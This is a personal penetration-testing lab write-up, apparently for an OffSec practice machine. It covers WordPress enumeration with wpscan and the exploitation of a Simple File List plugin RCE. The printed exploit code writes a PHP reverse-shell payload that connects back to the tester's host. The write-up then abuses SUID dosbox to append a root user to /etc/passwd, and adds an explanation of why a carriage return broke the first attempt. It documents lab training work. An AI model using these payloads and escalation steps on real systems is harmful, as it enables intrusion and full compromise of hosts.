
Autorecon 192.168.160.105

```
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 61 OpenSSH 8.3 (protocol 2.0)
80/tcp    open  http    syn-ack ttl 61 Apache httpd 2.4.46 ((Unix) PHP/7.4.10)
|_http-generator: WordPress 5.5.1
3306/tcp  open  mysql   syn-ack ttl 61 MariaDB 10.3.24 or later (unauthorized)
5000/tcp  open  upnp?   syn-ack ttl 61
13000/tcp open  unknown syn-ack ttl 61
36445/tcp open  unknown syn-ack ttl 61
```

port
- 80 (web) - Ran a couple of wpscan to see plugins and users. admin seems to be a user.
```
┌──(kali㉿kali)-[~/offsec/nukem]
└─$ wpscan --url http://192.168.160.105 --plugins-detection aggressive --disable-tls-checks

[+] akismet
 | Location: http://192.168.160.105/wp-content/plugins/akismet/
 | Last Updated: 2026-08-18T23:42:00.000Z
 | Readme: http://192.168.160.105/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 5.7.2
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.160.105/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.1.6 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.160.105/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.160.105/wp-content/plugins/akismet/readme.txt

[+] https://github.com/placetopay/woocommerce-gateway-placetopay
 | Location: http://192.168.160.105/wp-content/plugins/https://github.com/placetopay/woocommerce-gateway-placetopay/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://github.com/placetopay/woocommerce-gateway-placetopay/, status: 200
 |
 | The version could not be determined.

[+] make-paths-relative
 | Location: http://192.168.160.105/wp-content/plugins/make-paths-relative/
 | Last Updated: 2025-07-22T14:32:00.000Z
 | Readme: http://192.168.160.105/wp-content/plugins/make-paths-relative/readme.txt
 | [!] The version is out of date, the latest version is 2.1.0
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.160.105/wp-content/plugins/make-paths-relative/, status: 200
 |
 | Version: 1.1.2 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.160.105/wp-content/plugins/make-paths-relative/readme.txt

[+] relative-url
 | Location: http://192.168.160.105/wp-content/plugins/relative-url/
 | Last Updated: 2026-10-12T19:58:00.000Z
 | Readme: http://192.168.160.105/wp-content/plugins/relative-url/readme.txt
 | [!] The version is out of date, the latest version is 0.1.9
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.160.105/wp-content/plugins/relative-url/, status: 200
 |
 | Version: 0.1.7 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.160.105/wp-content/plugins/relative-url/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.160.105/wp-content/plugins/relative-url/readme.txt

[+] simple-file-list
 | Location: http://192.168.160.105/wp-content/plugins/simple-file-list/
 | Last Updated: 2026-06-22T20:32:00.000Z
 | Readme: http://192.168.160.105/wp-content/plugins/simple-file-list/readme.txt
 | [!] The version is out of date, the latest version is 6.3.10
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.160.105/wp-content/plugins/simple-file-list/, status: 200
 |
 | Version: 4.2.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.160.105/wp-content/plugins/simple-file-list/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.160.105/wp-content/plugins/simple-file-list/readme.txt

[+] tutor
 | Location: http://192.168.160.105/wp-content/plugins/tutor/
 | Last Updated: 2026-11-09T21:34:00.000Z
 | Readme: http://192.168.160.105/wp-content/plugins/tutor/readme.txt
 | [!] The version is out of date, the latest version is 4.2.1
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.160.105/wp-content/plugins/tutor/, status: 200
 |
 | Version: 1.5.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.160.105/wp-content/plugins/tutor/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.160.105/wp-content/plugins/tutor/readme.txt
```

```
┌──(kali㉿kali)-[~/offsec/nukem]
└─$ wpscan --url http://192.168.160.105 --enumerate ap,u,t  --disable-tls-checks   
...
[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.160.105/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

```

Search exploitdb for all the listed plugins
- akismet - cross site scripting (unlikely the route)
- woocommerce - possibly but we need to find the version number as there is many exploits for this
- make paths relative - no exploits
- relative url - no exploits
- simple file list - RCE for version 4.2.2 which is our version
- tutor (skip lol because seems obvious box is asking for the plugin above)

Ran all three exploits `48449`, `48979`, `52371`. All did not work.
Look into `48979`
```
def generate():
    filename = f'{random.randint(0, 10000)}.png'
    password = hashlib.md5(bytearray(random.getrandbits(8)
                                     for _ in range(20))).hexdigest()
    with open(f'{filename}', 'wb') as f:
        payload = '<?php passthru("bash -i >& /dev/tcp/192.168.1.1/4444 0>&1"); ?>'
        f.write(payload.encode())
    print(f'[ ] File {filename} generated with password: {password}')
    return filename, password

def generate():
    filename = f'{random.randint(0, 10000)}.png'
    password = hashlib.md5(bytearray(random.getrandbits(8)
                                     for _ in range(20))).hexdigest()
    with open(f'{filename}', 'wb') as f:
        payload = '<?php passthru("bash -i >& /dev/tcp/192.168.45.212/13000 0>&1"); ?>'
        f.write(payload.encode())
    print(f'[ ] File {filename} generated with password: {password}')
    return filename, password
```

Realised I have to change the payload to our IP. And chose port 13000 as the listening port since its detected to be open and I have tried initial 4444 which did not work. Caught a reverse shell.

## Privesc

Check SUID and capabilities. 

Apparently `dosbox` has a SUID write on gtfo bins. Bricked the box with this command. Need to revert.
```
dosbox -c 'mount c /' -c "echo hacker:$1$iwsCv3nr$A8ZFYPVvSE4O0kVpjszuO1:0:0:root:/root:/bin/bash >c:\etc\passwd" -c exit
```

Needed to double arrow to append...And touch up on the quotes
```
dosbox -c 'mount c /' -c 'echo hacker3:$1$iwsCv3nr$A8ZFYPVvSE4O0kVpjszuO1:0:0:root:/root:/bin/bash >>c:\etc\passwd' -c exit

[http@nukem simple-file-list]$ su hacker3
Password: pwned
Warning: your password will expire in 32640 days.
: No such file or directorybash
```

It still does not work. Note that `echo` terminates the string with a DOS-style line terminator (`\r\n`), if that’s a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write. So I decide to just remove the ending `:/bin/bash`
```
dosbox -c 'mount c /' -c 'echo hacker6:$1$iwsCv3nr$A8ZFYPVvSE4O0kVpjszuO1:0:0:root:/root >>c:\etc\passwd' -c exit
[http@nukem simple-file-list]$ su hacker6
Password: 
Warning: your password will expire in 32750 days.
sh-5.0# whoami
root
```

Finally it works.

## Notes
Both lines actually have a hidden `\r` (carriage return) at the very end, because DOSBox put it there. You can't see it, but it's there. Let me draw it as `[CR]`:

```
hacker3:...:0:0:root:/root:/bin/bash[CR]
hacker6:...:0:0:root:/root[CR]
```

Now remember how Linux reads a `/etc/passwd` line — it splits it by colons into fields. The **last field is the login shell** (the program to run when you log in).

**hacker3 — broken:**

```
hacker3 : hash : 0 : 0 : root : /root : /bin/bash[CR]
                                          ↑
                                   SHELL = "/bin/bash[CR]"
```

The `[CR]` is stuck to `/bin/bash`, so the shell is `/bin/bash[CR]` — a program name that **does not exist**. Linux can't find it, login fails. 💥

**hacker6 — works:**

```
hacker6 : hash : 0 : 0 : root : /root[CR]
                                  ↑          ↑
                            HOME = "/root[CR]"   SHELL = (nothing!)
```

You deleted `/bin/bash` from the end. So now:

- The `[CR]` got stuck to `/root` (the **home folder**) instead.
- There's **no shell field at all** — it's empty.

Two things happen:

1. **Empty shell field** → Linux uses a safe default, `/bin/sh`, which is a real working program. ✅
2. The broken `/root[CR]` is the home folder, and `su` doesn't actually use the home folder, so nobody cares that it's broken. ✅
**The one-sentence version:** the `[CR]` garbage has to land _somewhere_. In hacker3 it landed on the shell (the thing Linux runs → breaks). In hacker6 you moved it onto the home folder (a thing Linux ignores → fine), and the empty shell field makes Linux fall back to `/bin/sh`.

Same password, same `0:0` (root), only difference is **where the invisible junk ended up**.
